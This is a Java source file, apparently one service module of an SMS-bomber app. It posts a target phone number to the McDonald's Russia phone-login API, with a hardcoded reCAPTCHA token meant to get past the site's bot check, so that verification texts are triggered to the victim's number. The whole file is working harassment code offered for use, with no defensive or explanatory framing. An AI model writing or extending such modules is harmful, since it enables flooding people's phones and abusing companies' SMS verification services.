package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

public class Mcdonalds extends JsonService {

    public Mcdonalds() {
        super("https://site-api.mcdonalds.ru/api/v1/user/login/phone", POST);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("number", "+" + getFormattedPhone());
            json.put("g-recaptcha-response", "03AGdBq24rQ30xdNbVMpoibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atTsBgy2p4N7MlR77lDY9HybTWn5U9V");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
